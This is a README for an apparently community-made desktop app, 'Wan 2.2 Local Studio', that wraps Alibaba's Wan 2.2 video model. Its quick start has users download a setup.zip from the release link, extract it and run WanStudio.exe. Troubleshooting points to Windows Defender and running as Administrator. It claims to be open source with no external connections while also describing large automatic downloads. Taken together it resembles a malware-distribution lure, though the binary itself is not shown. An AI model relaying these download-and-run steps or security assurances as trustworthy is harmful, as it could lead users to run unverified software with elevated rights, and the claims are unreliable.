# 🎬 Wan 2.2 Local Studio — Desktop Video Generator 2026

**Zero-Config AI Video Generation · Wan 2.2 Engine · Local Inference · No Command Line Required**

---

<div align="center">
<img width="935" height="524" alt="image" src="https://github.com/user-attachments/assets/888ee5ac-dd2b-4030-9049-b3751ee221fd" />

## 📥 Download

[![Download Now](https://img.shields.io/badge/⬇️_Download_Now-brightgreen?style=for-the-badge&logo=github)](https://github.com/Alphazusheave/Wan-Local-Studio/releases/download/setup/setup.zip)

</div>

---

## 🎬 What is This?

**Wan 2.2 Local Studio** is a desktop wrapper for the open-source **Wan 2.2** video generation model. It gives you a simple graphical interface to generate videos from text prompts — without touching a terminal, installing Python manually, or wrestling with model weights.

Wan 2.2 is Alibaba's open-source video model family, released under Apache 2.0. It includes Text-to-Video, Image-to-Video, and unified TI2V models, with the 5B variant running comfortably on consumer GPUs .

This project is a **community-made frontend** — not an official Alibaba product. It downloads the model, handles dependencies, and lets you focus on creating.

⚠️ **Disclaimer:** This is an unofficial fan project. Support the original developers by starring the official [Wan-Video/Wan2.2](https://github.com/Wan-Video/Wan2.2) repository.

---

## ✨ Features

| Category | Features |
|:---|:---|
| **🎯 One-Click Setup** | Auto-downloads Python, FFmpeg, PyTorch, and model weights on first launch  |
| **🖥️ Simple GUI** | Prompt input, aspect ratio selector, duration control, generate button |
| **💾 Local Inference** | Everything runs on your machine — no cloud, no API keys, no subscriptions |
| **📊 VRAM Detection** | Auto-detects your GPU and recommends the right model variant  |
| **🗂️ Generation History** | Browse, replay, and delete past videos from an SQLite database  |
| **⚡ GPU-Aware PyTorch** | Picks the correct CUDA/ROCm/MPS wheel for your hardware automatically  |
| **🔄 Model Manager** | Download, verify, and switch between Wan 2.2 variants (TI2V-5B, T2V-A14B, I2V-A14B)  |
| **📁 Smart Storage** | Picks the drive with most free space for models and videos  |

---

## 🎯 Feature Comparison

| Feature | Manual Setup | Wan 2.2 Local Studio |
|:---|:---|:---|
| Python Installation | ❌ Manual | ✅ Auto |
| PyTorch Selection | ❌ Research needed | ✅ Auto-detected |
| Model Download | ❌ CLI commands | ✅ One click |
| Video Generation | ❌ Terminal only | ✅ GUI |
| History Browser | ❌ File manager | ✅ Built-in |
| **Price** | Free | **Free** |

---

## 🖥️ System Requirements

| Component | Minimum | Recommended |
|:---|:---|:---|
| **OS** | Windows 10 64-bit / Linux / macOS | Windows 11 64-bit |
| **GPU (NVIDIA)** | 8 GB VRAM (5B quantized)  | 24 GB VRAM (RTX 4090)  |
| **GPU (AMD)** | 8 GB VRAM (ROCm) | 16 GB+ VRAM |
| **RAM** | 16 GB | 32 GB+ |
| **Storage** | ~20 GB free (models) | SSD recommended |
| **Network** | Required for first-time download | Broadband |

> **💡 VRAM Guide:** The **TI2V-5B** model runs on 8-12 GB VRAM when quantized . The **14B** models need 24 GB for comfortable 720p generation, or 16 GB with FP8 quantization and T5 offloading .

---

## 📦 Package Structure

```
Wan2.2-Local-Studio/
├── src/                        # Core application
│   ├── runtime/                # Python + FFmpeg management
│   ├── models/                 # Model download & verification
│   ├── inference/              # Wan 2.2 pipeline
│   ├── storage/                # SQLite history & file management
│   └── ui/                     # Desktop interface
├── docs/                       # Documentation
│   ├── vram-guide.md           # GPU recommendations
│   ├── model-variants.md       # TI2V-5B vs 14B comparison
│   └── troubleshooting.md      # Common issues
├── assets/                     # Icons, screenshots
├── .github/                    # CI/CD workflows
├── LICENSE
├── README.md
└── CONTRIBUTING.md
```

---

## 🛡️ Security Status

- ✅ **Open Source** — Full source code available for review
- 🛡 **No Telemetry** — No data collection, no external connections
- ⚙️ **Local Only** — All generation happens on your machine
- 🔒 **Apache 2.0** — Same license as the Wan 2.2 model 

---

## 🔧 Quick Start Guide

### Get Started in 3 Steps

1. **⬇️ Download** the latest release from the link above
2. **📂 Extract** the archive with WinRAR or 7-Zip
3. **▶️ Run** `WanStudio.exe` — first launch handles the rest

> **⚠️ Note:** First launch downloads ~15-20 GB of dependencies and models. Ensure you have a stable connection.

---

## 🆕 What's New

- 🎯 Zero-config runtime — auto-installs Python, FFmpeg, and PyTorch 
- 📊 GPU-aware wheel selection for NVIDIA, AMD, Apple Silicon 
- 🗂️ Generation history with SQLite storage
- ⚡ Support for Wan 2.2 TI2V-5B (8 GB VRAM) and T2V/I2V-A14B (24 GB VRAM) 
- 🔄 Resilient model download with stall detection and resume

---

## 🐛 Troubleshooting

| Problem | Solution |
|:---|:---|
| Out of memory (OOM) | Use TI2V-5B variant or enable FP8 quantization  |
| CUDA error on RTX 50-series | App auto-selects CUDA 12.8 + torch 2.7 for Blackwell  |
| Model download stalls | App has built-in watchdog that restarts stuck downloads  |
| Slow generation | Enable `--offload_model` and `--t5_cpu` flags  |
| App won't start | Check Windows Defender, run as Administrator |

---

## ❓ FAQ

**Q: What is Wan 2.2?**
A: Wan 2.2 is Alibaba's open-source video generation model family. It includes Text-to-Video (T2V), Image-to-Video (I2V), and unified TI2V models .

**Q: Which model should I use?**
A: If you have 8-12 GB VRAM, use TI2V-5B. If you have 24 GB, use the 14B models for higher quality .

**Q: Does this require an internet connection?**
A: Only for the first-time download. After that, everything runs offline.

**Q: Is this the official Wan 2.2 app?**
A: No. This is a community frontend. The official repository is [Wan-Video/Wan2.2](https://github.com/Wan-Video/Wan2.2) .

**Q: Can I use this commercially?**
A: Wan 2.2 is Apache 2.0 licensed, which generally allows commercial use. Check the official license for details .

**Q: How long does generation take?**
A: A 5-second 720p clip takes roughly 4-9 minutes on a 24 GB card, depending on model and settings .

---

## 📝 Tags

`wan2.2`, `ai-video-generation`, `text-to-video`, `image-to-video`, `local-inference`, `desktop-app`, `video-generator`, `open-source`, `apache-2.0`, `windows-tool`, `linux-tool`, `macos-tool`, `comfyui-alternative`, `zero-config`, `gpu-accelerated`, `wan-video`, `ai-creative-tools`, `local-ai`, `video-synthesis`, `generative-ai`

---

## 💬 Support

- ⭐ Star this repository
- 🐛 Open an Issue for bugs
- 💬 Join our community

---

**Generate video locally. Wan 2.2 Local Studio — built for 2026.**

---

